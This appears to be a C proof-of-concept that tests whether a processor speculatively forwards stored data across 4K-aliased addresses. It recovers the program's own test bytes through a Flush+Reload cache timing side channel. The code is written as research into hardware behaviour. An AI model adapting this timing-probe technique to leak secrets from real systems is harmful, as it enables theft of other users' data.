/* Compile with "gcc -O0 -std=gnu99 4k_aliasing_attack.c -o 4k_aliasing_attack" */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <x86intrin.h>

#define CACHE_HIT_THRESHOLD 80
uint8_t array2[256 * 512];

/* Create two addresses with same lower 12 bits but different physical pages */
int setup_4k_alias(uint8_t **addr_a, uint8_t **addr_b, size_t offset) {
  void *page1 = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  void *page2 = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  if (page1 == MAP_FAILED || page2 == MAP_FAILED) {
    return -1;
  }

  *addr_a = (uint8_t *)page1 + offset;
  *addr_b = (uint8_t *)page2 + offset;

  printf("4K-aliased addresses: %p and %p (offset: 0x%lx)\n",
         *addr_a, *addr_b, ((uintptr_t)*addr_a) & 0xFFF);
  return 0;
}

/* Attack: Store secret to addr_a, load from aliased addr_b */
void attack(uint8_t *store_addr, uint8_t *load_addr, uint8_t secret) {
  *store_addr = secret;
  uint8_t loaded = *load_addr;
  uint8_t dummy = array2[loaded * 512];  // Cache side-channel
  asm volatile("" : : "r"(dummy) : "memory");
}

/* Probe cache to see which byte was accessed */
uint8_t probe_cache(int *confidence) {
  int results[256] = {0};
  unsigned int junk = 0;

  for (int tries = 0; tries < 100; tries++) {
    for (int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) & 255;
      volatile uint8_t *addr = &array2[mix_i * 512];

      uint64_t time1 = __rdtscp(&junk);
      junk = *addr;
      uint64_t time2 = __rdtscp(&junk) - time1;

      if (time2 <= CACHE_HIT_THRESHOLD)
        results[mix_i]++;
    }
  }

  int max_hits = 0, max_val = 0, second_max = 0;
  for (int i = 0; i < 256; i++) {
    if (results[i] > max_hits) {
      second_max = max_hits;
      max_hits = results[i];
      max_val = i;
    } else if (results[i] > second_max) {
      second_max = results[i];
    }
  }

  *confidence = max_hits - second_max;
  return (uint8_t)max_val;
}

/* Try to leak a byte using 4K-aliasing */
int try_leak(uint8_t secret_byte) {
  uint8_t *store_addr, *load_addr;

  if (setup_4k_alias(&store_addr, &load_addr, 256) != 0)
    return -1;

  printf("Attempting to leak: 0x%02X ('%c')\n", secret_byte,
         (secret_byte > 31 && secret_byte < 127) ? secret_byte : '?');

  // Initialize side-channel array
  for (int i = 0; i < sizeof(array2); i++)
    array2[i] = 1;

  // Perform attack 1000 times
  for (int i = 0; i < 1000; i++) {
    for (int j = 0; j < 256; j++)
      _mm_clflush(&array2[j * 512]);

    _mm_clflush(store_addr);
    _mm_clflush(load_addr);

    for (volatile int z = 0; z < 100; z++);  // Delay

    attack(store_addr, load_addr, secret_byte);
  }

  int confidence;
  uint8_t leaked = probe_cache(&confidence);

  printf("Leaked: 0x%02X ('%c'), confidence: %d\n", leaked,
         (leaked > 31 && leaked < 127) ? leaked : '?', confidence);

  if (leaked == secret_byte && confidence > 10) {
    printf("SUCCESS!\n\n");
    return 1;
  }
  printf("FAILED\n\n");
  return 0;
}

int main() {
  printf("=== 4K-Aliasing Speculative Forwarding Attack ===\n\n");

  uint8_t test_bytes[] = {'A', 'X', 0x42, 0x7F};
  int success = 0, total = 0;

  for (int i = 0; i < 4; i++) {
    int result = try_leak(test_bytes[i]);
    if (result > 0) success++;
    if (result >= 0) total++;
  }

  printf("\n=== Summary ===\n");
  printf("Successful leaks: %d / %d\n\n", success, total);

  if (success > 0) {
    printf("RESULT: Attack SUCCEEDED\n");
    printf("Processor speculatively forwards based on 4K-aliasing\n");
  } else {
    printf("RESULT: Attack FAILED\n");
    printf("Processor does NOT speculatively forward based on 4K-aliasing\n");
  }

  return 0;
}
